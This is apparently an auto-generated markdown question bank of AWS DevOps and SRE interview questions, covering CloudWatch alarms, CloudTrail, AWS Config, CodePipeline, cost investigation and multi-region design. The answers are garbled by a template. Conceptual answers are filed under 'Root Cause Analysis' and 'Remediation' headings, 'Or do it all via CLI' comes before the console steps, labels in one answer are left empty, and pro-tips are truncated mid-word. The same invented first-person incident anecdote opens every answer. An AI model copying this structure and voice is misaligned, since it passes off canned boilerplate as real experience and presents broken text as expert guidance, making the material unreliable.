<a id="scenario-52-aws-q36-you-want-to-get-an-alert-when-your-ec2-instance-cpu-exceeds-80-for-more-than-5-minutes-how-do-you-set-this-up-l2"></a>
### 52. AWS Q36: You want to get an alert when your EC2 instance CPU exceeds 80% for more than 5 minutes How do you set this up [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Monitoring & CloudWatch` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Monitoring & CloudWatch` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You want to get an alert when your EC2 instance CPU exceeds 80% for more than 5 minutes. How do you set this up?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Or do it all via CLI:

- In CloudWatch, create an **Alarm**:
- Metric: `EC2 → Per-Instance Metrics → CPUUtilization`
- Statistic: Average
- Period: 5 minutes (300 seconds)
- Condition: `> 80`

##### 2️⃣ Remediation & Permanent Safeguards

---

- Evaluation periods: 1 (alarm triggers after 1 period = 5 minutes above threshold)
- Add an **SNS action** — send notification to an SNS topic.
- Subscribe your email or PagerDuty endpoint to the SNS topic.

```bash
aws cloudwatch put-metric-alarm \
  --alarm-name HighCPU \
  --metric-name CPUUtilization \
  --namespace AWS/EC2 \
  --statistic Average \
  --period 300 \
  --threshold 80 \
  --comparison-operator GreaterThanThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:...
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: In CloudWatch, create an Alarm:.

#### ⏱️ 60-Second Elevator Pitch Summary

- In CloudWatch, create an Alarm:
- Metric: EC2 → Per-Instance Metrics → CPUUtilization
- Statistic: Average

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-53-aws-q37-what-is-the-difference-between-cloudwatch-logs-cloudwatch-metrics-and-cloudwatch-alarms-l2"></a>
### 53. AWS Q37: What is the difference between CloudWatch Logs CloudWatch Metrics and CloudWatch Alarms [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Monitoring & CloudWatch` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Monitoring & CloudWatch` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the difference between CloudWatch Logs, CloudWatch Metrics, and CloudWatch Alarms?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

The flow: App → writes logs to CloudWatch Logs → Metric Filter extracts numbers → custom CloudWatch Metric → Alarm watches metric → SNS notification sent.

- **CloudWatch Logs** — stores raw log data (text). Your app, Lambda, ECS, VPC Flow Logs all write here. You can search/query with CloudWatch Logs Insights.
- **CloudWatch Metrics** — numeric time-series data. CPU%, request count, latency, error rate. Built-in for AWS services; custom metrics from your app via the CloudWatch SDK/API.
- **CloudWatch Alarms** — watches a metric and triggers an action when a threshold is breached. Actions: SNS notification, Auto Scaling policy, EC2 action (stop/reboot).

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CloudWatch Logs — stores raw log data (text). Your app, Lambda, ECS, VPC Flow Logs all write here. You can search/query with Cloud.

#### ⏱️ 60-Second Elevator Pitch Summary

- CloudWatch Logs — stores raw log data (text). Your app, Lambda, ECS, VPC Flow Logs all write here...
- CloudWatch Metrics — numeric time-series data. CPU%, request count, latency, error rate. Built-in...
- CloudWatch Alarms — watches a metric and triggers an action when a threshold is breached. Actions...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-54-aws-q38-your-application-has-no-observability-and-you-need-to-build-a-monitoring-stack-from-scratch-on-aws-what-would-you-set-up-l3"></a>
### 54. AWS Q38: Your application has no observability and you need to build a monitoring stack from scratch on AWS What would you set up [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Monitoring & CloudWatch` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Monitoring & CloudWatch` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your application has no observability and you need to build a monitoring stack from scratch on AWS. What would you set up?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Layer by layer:

- CloudWatch with EC2/ECS/RDS default metrics.
- CloudWatch Agent on EC2 for memory, disk (not in default metrics).
- Custom CloudWatch metrics via AWS SDK (request rate, error rate, business metrics).
- Or: Prometheus + Grafana running on ECS/EKS. More flexible.
- CloudWatch Logs (simple) or OpenSearch (for complex searching).
- Log groups per service, retention policy set.

##### 2️⃣ Remediation & Permanent Safeguards

**Infrastructure metrics:** **Application metrics:** **Logs:** **Distributed tracing:** **Alerting:** **Dashboards:** **Uptime monitoring:** ---

- AWS X-Ray — traces requests across services, shows where latency is.
- CloudWatch Alarms → SNS → PagerDuty/Slack.
- CloudWatch dashboards or Grafana for a unified view.
- CloudWatch Synthetics — canary scripts that test your endpoints from outside.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CloudWatch with EC2/ECS/RDS default metrics..

#### ⏱️ 60-Second Elevator Pitch Summary

- CloudWatch with EC2/ECS/RDS default metrics.
- CloudWatch Agent on EC2 for memory, disk (not in default metrics).
- Custom CloudWatch metrics via AWS SDK (request rate, error rate, business metrics).

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-55-aws-q39-youre-being-charged-for-more-cloudwatch-api-calls-than-expected-how-do-you-investigate-and-reduce-costs-l3"></a>
### 55. AWS Q39: Youre being charged for more CloudWatch API calls than expected How do you investigate and reduce costs [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Monitoring & CloudWatch` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Monitoring & CloudWatch` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You're being charged for more CloudWatch API calls than expected. How do you investigate and reduce costs?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **Cost Explorer** — filter by service CloudWatch to see which API calls cost the most (GetMetricStatistics, PutLogEvents, etc.).
- **Reduce log retention** — logs stored indefinitely are the biggest cost driver. Set retention (30/90 days depending on compliance).
- **High-resolution metrics** — 1-second metrics cost 10x more than 1-minute. Only use for critical alarms.
- **Agent config** — CloudWatch Agent flush interval. Shorter interval = more API calls. Increase from 10s to 60s for non-critical metrics.

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **Reduce custom metric count** — each unique metric (unique combination of namespace + dimensions) has a cost.
- **Use EMF (Embedded Metric Format)** — batch metrics embedded in log entries. Cheaper than individual PutMetricData calls.
- **S3 access logs → Athena** instead of CloudWatch for high-volume access logs analysis.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Cost Explorer — filter by service CloudWatch to see which API calls cost the most (GetMetricStatistics, PutLogEvents, etc.)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Cost Explorer — filter by service CloudWatch to see which API calls cost the most (GetMetricStati...
- Reduce log retention — logs stored indefinitely are the biggest cost driver. Set retention (30/90...
- High-resolution metrics — 1-second metrics cost 10x more than 1-minute. Only use for critical ala...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-56-aws-q40-what-is-aws-cloudtrail-and-how-is-it-different-from-cloudwatch-l2"></a>
### 56. AWS Q40: What is AWS CloudTrail and how is it different from CloudWatch [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Monitoring & CloudWatch` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Monitoring & CloudWatch` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is AWS CloudTrail and how is it different from CloudWatch?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

CloudTrail logs: `Bob assumed the role AdminRole at 3:47 PM and called ec2:TerminateInstances on i-123456.`

- **CloudTrail** — records API calls made to AWS. Who did what, when, from where. "Audit trail." Example: who deleted that S3 bucket? Who changed that Security Group?
- **CloudWatch** — operational monitoring. Metrics, logs, alarms. How is the system performing right now?

##### 2️⃣ Remediation & Permanent Safeguards

CloudWatch logs: `App server error rate is 5.2% for the last 10 minutes.` Use CloudTrail for: security investigations, compliance auditing, change tracking. Enable in all regions. Store logs in S3 with immutable retention (S3 Object Lock) for compliance. --- ## 🔵 CI/CD on AWS ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CloudTrail — records API calls made to AWS. Who did what, when, from where. "Audit trail." Example: who deleted that S3 bucket? Wh.

#### ⏱️ 60-Second Elevator Pitch Summary

- CloudTrail — records API calls made to AWS. Who did what, when, from where. "Audit trail." Exampl...
- CloudWatch — operational monitoring. Metrics, logs, alarms. How is the system performing right now?

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-57-aws-q41-walk-me-through-building-a-ci-cd-pipeline-for-a-containerized-app-using-aws-native-services-l2"></a>
### 57. AWS Q41: Walk me through building a CI/CD pipeline for a containerized app using AWS-native services [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `CI/CD on AWS` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `CI/CD on AWS` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Walk me through building a CI/CD pipeline for a containerized app using AWS-native services."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

For ECS Blue/Green with CodeDeploy:

- **CodeCommit or GitHub** — source code repository. Push triggers the pipeline.
- **CodeBuild** — builds the Docker image, runs tests, pushes image to **ECR** (Elastic Container Registry).
- **ECR** — stores the Docker image.
- **CodeDeploy or ECS Blue/Green** — deploys the new image to ECS/EKS.
- **CodePipeline** — orchestrates the full pipeline: Source → Build → Test → Deploy.
- CodeDeploy creates a new task set with the new image.

##### 2️⃣ Remediation & Permanent Safeguards

---

- Routes test traffic to it.
- After validation, shifts production traffic over.
- Terminates old task set.
- Supports instant rollback.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CodeCommit or GitHub — source code repository. Push triggers the pipeline..

#### ⏱️ 60-Second Elevator Pitch Summary

- CodeCommit or GitHub — source code repository. Push triggers the pipeline.
- CodeBuild — builds the Docker image, runs tests, pushes image to ECR (Elastic Container Registry).
- ECR — stores the Docker image.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-58-aws-q42-your-codebuild-job-is-failing-with-a-permissions-error-when-trying-to-push-to-ecr-what-do-you-check-l2"></a>
### 58. AWS Q42: Your CodeBuild job is failing with a permissions error when trying to push to ECR What do you check [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `CI/CD on AWS` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `CI/CD on AWS` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your CodeBuild job is failing with a permissions error when trying to push to ECR. What do you check?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

CodeBuild uses a **service role**. That role needs ECR permissions:

- `ecr:GetAuthorizationToken` — to authenticate with ECR.
- `ecr:BatchCheckLayerAvailability`, `ecr:PutImage`, `ecr:InitiateLayerUpload`, etc. — to push layers.

##### 2️⃣ Remediation & Permanent Safeguards

In the CodeBuild buildspec.yml, the login command: This requires `ecr:GetAuthorizationToken` at minimum. Check the service role policy. Also check: ECR repository policy — cross-account pushes need a resource policy on the ECR repo too. --- ## 🟠 Cost & Architecture ---

```bash
aws ecr get-login-password | docker login --username AWS --password-stdin <account>.dkr.ecr.<region>.amazonaws.com
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: ecr:GetAuthorizationToken — to authenticate with ECR..

#### ⏱️ 60-Second Elevator Pitch Summary

- ecr:GetAuthorizationToken — to authenticate with ECR.
- ecr:BatchCheckLayerAvailability, ecr:PutImage, ecr:InitiateLayerUpload, etc. — to push layers.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-59-aws-q43-design-a-highly-available-scalable-web-application-architecture-on-aws-for-a-startup-that-expects-unpredictable-traffic-l3"></a>
### 59. AWS Q43: Design a highly available scalable web application architecture on AWS for a startup that expects unpredictable traffic [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Design a highly available, scalable web application architecture on AWS for a startup that expects unpredictable traffic."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Key design decisions:

- **Fargate** — no instance management, auto-scales, pay per task (good for unpredictable traffic).
- **Multi-AZ everything** — ALB, RDS, ECS tasks across at least 2 AZs.
- **CloudFront** — reduce load on origin for static content.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Route 53 health checks** — failover to secondary region if primary is down.
- **Auto Scaling on ECS** — scale based on CPU/request count with target tracking.

```bash
Route 53 (DNS + health checks)
    ↓
CloudFront (CDN for static assets + caching)
    ↓
ALB (Application Load Balancer, multi-AZ)
    ↓
ECS Fargate (auto-scaling container tasks, multi-AZ)
    ↓
RDS (Multi-AZ, with read replicas)
RDS Proxy (connection pooling)
ElastiCache Redis (session store + caching)
    ↓
S3 (static assets, uploads)
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Fargate — no instance management, auto-scales, pay per task (good for unpredictable traffic)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Fargate — no instance management, auto-scales, pay per task (good for unpredictable traffic).
- Multi-AZ everything — ALB, RDS, ECS tasks across at least 2 AZs.
- CloudFront — reduce load on origin for static content.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-60-aws-q44-what-is-the-shared-responsibility-model-in-aws-l2"></a>
### 60. AWS Q44: What is the shared responsibility model in AWS [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the shared responsibility model in AWS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

AWS and you share responsibility for security:

- Security OF the cloud — hardware, facilities, networking, hypervisor, managed service infrastructure.
- Patching the underlying EC2 hypervisor.
- Physical security of data centers.
- Security IN the cloud — your OS, applications, data, IAM, Security Groups, encryption.
- Patching your EC2 OS (you own the OS).

##### 2️⃣ Remediation & Permanent Safeguards

**AWS is responsible for:** **You are responsible for:** Example: If your EC2 OS has an unpatched vulnerability, that's your responsibility, not AWS's. If the hypervisor has a vulnerability, that's AWS's responsibility. ---

- Encrypting data at rest and in transit.
- Proper IAM configuration.
- Application-level security.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Security OF the cloud — hardware, facilities, networking, hypervisor, managed service infrastructure..

#### ⏱️ 60-Second Elevator Pitch Summary

- Security OF the cloud — hardware, facilities, networking, hypervisor, managed service infrastruct...
- Patching the underlying EC2 hypervisor.
- Physical security of data centers.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-61-aws-q45-your-aws-bill-doubled-this-month-unexpectedly-how-do-you-investigate-l3"></a>
### 61. AWS Q45: Your AWS bill doubled this month unexpectedly How do you investigate [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your AWS bill doubled this month unexpectedly. How do you investigate?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **AWS Cost Explorer** — open it, filter by service. Which service increased?
- **Filter by time** — compare this month vs last month. Find the day the cost jumped.
- **Cost and Usage Report (CUR)** — most granular billing data. Query with Athena if needed.
- **Check for data transfer** — inter-region, internet egress. A new service sending data outside AWS is expensive.
- **Check EC2 instances** — a runaway Auto Scaling group could have spawned many instances.

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **Check NAT Gateway** — NAT Gateway charges per GB. A bug causing high-volume traffic through NAT is a common culprit.
- **Check CloudWatch** — too many custom metrics or log ingestion.
- **Enable AWS Budgets** — set alerts to catch this earlier next time.
- **Enable Cost Anomaly Detection** — ML-based alerts for unusual spend patterns.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: AWS Cost Explorer — open it, filter by service. Which service increased?.

#### ⏱️ 60-Second Elevator Pitch Summary

- AWS Cost Explorer — open it, filter by service. Which service increased?
- Filter by time — compare this month vs last month. Find the day the cost jumped.
- Cost and Usage Report (CUR) — most granular billing data. Query with Athena if needed.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-62-aws-q46-what-is-aws-config-and-how-does-it-differ-from-cloudtrail-l2"></a>
### 62. AWS Q46: What is AWS Config and how does it differ from CloudTrail [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is AWS Config and how does it differ from CloudTrail?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Config continuously records resource configurations and changes. You can query: "Show me the configuration of this S3 bucket 30 days ago."

- **CloudTrail** — records API actions. "What happened?" Who called `ec2:TerminateInstances`?
- **AWS Config** — records the state of your resources over time. "What does my infrastructure look like?" What was the Security Group configuration on Jan 1st?

##### 2️⃣ Remediation & Permanent Safeguards

Config Rules let you define compliance checks: "All S3 buckets must have encryption enabled." Config evaluates and marks non-compliant resources. Use both together for full audit trail: Config for state, CloudTrail for actions. --- **Q47-Q100 — Rapid-fire AWS Scenarios**

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CloudTrail — records API actions. "What happened?" Who called ec2:TerminateInstances?.

#### ⏱️ 60-Second Elevator Pitch Summary

- CloudTrail — records API actions. "What happened?" Who called ec2:TerminateInstances?
- AWS Config — records the state of your resources over time. "What does my infrastructure look lik...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-63-aws-q47-your-s3-bucket-website-shows-403-forbidden-l1"></a>
### 63. AWS Q47: Your S3 bucket website shows 403 Forbidden [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `Cost & Architecture` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your S3 bucket website shows 403 Forbidden."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Static website hosting requires public read. Either make bucket public (then enable static hosting) or use CloudFront with Origin Access Control (OAC) — better.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Static website hosting requires public read. Either make bucket public (then enable static hosting) or use CloudFront with Origin .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Static website hosting requires public read. Either make bucket public (then enable static host
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-64-aws-q48-lambda-function-needs-to-access-rds-in-a-private-subnet-l2"></a>
### 64. AWS Q48: Lambda function needs to access RDS in a private subnet [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Lambda function needs to access RDS in a private subnet."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Put the Lambda function in the same VPC and private subnet. Add the Lambda's SG to the RDS inbound rules on DB port.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Put the Lambda function in the same VPC and private subnet. Add the Lambda's SG to the RDS inbound rules on DB port..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Put the Lambda function in the same VPC and private subnet. Add the Lambda's SG to the RDS inbo
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-65-aws-q49-ec2-instance-in-private-subnet-needs-to-call-aws-apis-eg-s3-ssm-how-without-nat-gateway-l2"></a>
### 65. AWS Q49: EC2 instance in private subnet needs to call AWS APIs (eg S3 SSM) How without NAT Gateway [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"EC2 instance in private subnet needs to call AWS APIs (e.g., S3, SSM). How without NAT Gateway?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use **VPC Endpoints** — Interface Endpoints or Gateway Endpoints for S3 and DynamoDB. Traffic stays within AWS network. Cheaper than NAT.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use VPC Endpoints — Interface Endpoints or Gateway Endpoints for S3 and DynamoDB. Traffic stays within AWS network. Cheaper than N.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use VPC Endpoints — Interface Endpoints or Gateway Endpoints for S3 and DynamoDB. Traffic stays
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-66-aws-q50-design-a-multi-region-active-active-architecture-l3"></a>
### 66. AWS Q50: Design a multi-region active-active architecture [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Design a multi-region active-active architecture."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Route 53 with latency-based or geolocation routing. Application in both regions. Aurora Global Database (primary in one region, read replicas globally, RPO < 1s). S3 cross-region replication. DynamoDB Global Tables.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Route 53 with latency-based or geolocation routing. Application in both regions. Aurora Global Database (primary in one region, re.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Route 53 with latency-based or geolocation routing. Application in both regions. Aurora Global
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-67-aws-q51-an-s3-lifecycle-rule-is-not-transitioning-objects-as-expected-l2"></a>
### 67. AWS Q51: An S3 lifecycle rule is not transitioning objects as expected [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An S3 lifecycle rule is not transitioning objects as expected."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Objects must be > 128KB for lifecycle transition to Glacier to apply. Also check the prefix filter matches your objects.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Objects must be > 128KB for lifecycle transition to Glacier to apply. Also check the prefix filter matches your objects..

#### ⏱️ 60-Second Elevator Pitch Summary

